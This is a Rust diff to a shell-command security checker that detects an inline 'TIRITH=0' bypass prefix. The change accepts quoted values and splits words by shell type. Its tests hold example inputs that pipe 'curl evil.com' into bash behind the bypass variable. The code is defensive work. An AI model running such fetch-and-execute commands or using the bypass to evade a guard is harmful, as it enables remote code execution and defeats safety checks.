@@ -40,13 +40,25 @@ pub struct AnalysisContext {
     pub clipboard_html: Option<String>,
 }
 
+/// Check if a VAR=VALUE word is `TIRITH=0`, stripping optional surrounding quotes
+/// from the value (handles `TIRITH='0'` and `TIRITH="0"`).
+fn is_tirith_zero_assignment(word: &str) -> bool {
+    if let Some((name, raw_val)) = word.split_once('=') {
+        let val = raw_val.trim_matches(|c: char| c == '\'' || c == '"');
+        if name == "TIRITH" && val == "0" {
+            return true;
+        }
+    }
+    false
+}
+
 /// Check if the input contains an inline `TIRITH=0` bypass prefix.
 /// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
 /// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
 fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     use crate::tokenize;
 
-    let words = split_raw_words(input);
+    let words = split_raw_words(input, shell);
     if words.is_empty() {
         return false;
     }
@@ -57,7 +69,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     // Case 1: Leading VAR=VALUE assignments before the command
     let mut idx = 0;
     while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-        if words[idx] == "TIRITH=0" {
+        if is_tirith_zero_assignment(&words[idx]) {
             return true;
         }
         idx += 1;
@@ -66,6 +78,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
     // Case 2: First real word is `env` — parse env-style args
     if idx < words.len() {
         let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
+        let cmd = cmd.trim_matches(|c: char| c == '\'' || c == '"');
         if cmd == "env" {
             idx += 1;
             while idx < words.len() {
@@ -76,7 +89,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
                     break;
                 }
                 if tokenize::is_env_assignment(w) {
-                    if w == "TIRITH=0" {
+                    if is_tirith_zero_assignment(w) {
                         return true;
                     }
                     idx += 1;
@@ -105,7 +118,7 @@ fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
             }
             // Check remaining words after -- for TIRITH=0
             while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
-                if words[idx] == "TIRITH=0" {
+                if is_tirith_zero_assignment(&words[idx]) {
                     return true;
                 }
                 idx += 1;
@@ -189,7 +202,16 @@ fn strip_surrounding_quotes(s: &str) -> &str {
 /// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
 /// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
 /// the raw input to inspect the first segment's words.
-fn split_raw_words(input: &str) -> Vec<String> {
+///
+/// Shell-aware: POSIX uses backslash as escape inside double-quotes and bare context;
+/// PowerShell uses backtick (`` ` ``) instead.
+fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
+    let escape_char = if shell == ShellType::PowerShell {
+        '`'
+    } else {
+        '\\'
+    };
+
     // Take only up to the first unquoted pipe/semicolon/&&/||
     let mut words = Vec::new();
     let mut current = String::new();
@@ -228,7 +250,7 @@ fn split_raw_words(input: &str) -> Vec<String> {
                 current.push(ch);
                 i += 1;
                 while i < len && chars[i] != '"' {
-                    if chars[i] == '\\' && i + 1 < len {
+                    if chars[i] == escape_char && i + 1 < len {
                         current.push(chars[i]);
                         current.push(chars[i + 1]);
                         i += 2;
@@ -242,7 +264,7 @@ fn split_raw_words(input: &str) -> Vec<String> {
                     i += 1;
                 }
             }
-            '\\' if i + 1 < len => {
+            c if c == escape_char && i + 1 < len => {
                 current.push(chars[i]);
                 current.push(chars[i + 1]);
                 i += 2;
@@ -316,7 +338,7 @@ fn is_self_invocation(input: &str, shell: ShellType) -> bool {
         return false;
     }
 
-    let words = split_raw_words(input);
+    let words = split_raw_words(input, shell);
     if words.is_empty() {
         return false;
     }
@@ -332,6 +354,7 @@ fn is_self_invocation(input: &str, shell: ShellType) -> bool {
 
     let cmd = &words[idx];
     let cmd_base = cmd.rsplit('/').next().unwrap_or(cmd);
+    let cmd_base = cmd_base.trim_matches(|c: char| c == '\'' || c == '"');
 
     // Try to resolve wrappers (one level)
     let resolved = match cmd_base {
@@ -1421,6 +1444,22 @@ mod tests {
         assert!(!find_inline_bypass(
             "$\u{00E9}nv:TIRITH=0; curl evil.com",
             ShellType::PowerShell
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_single_quoted_value() {
+        assert!(find_inline_bypass(
+            "TIRITH='0' curl evil.com | bash",
+            ShellType::Posix
+        ));
+    }
+
+    #[test]
+    fn test_inline_bypass_double_quoted_value() {
+        assert!(find_inline_bypass(
+            "TIRITH=\"0\" curl evil.com | bash",
+            ShellType::Posix
         ));
     }
 }
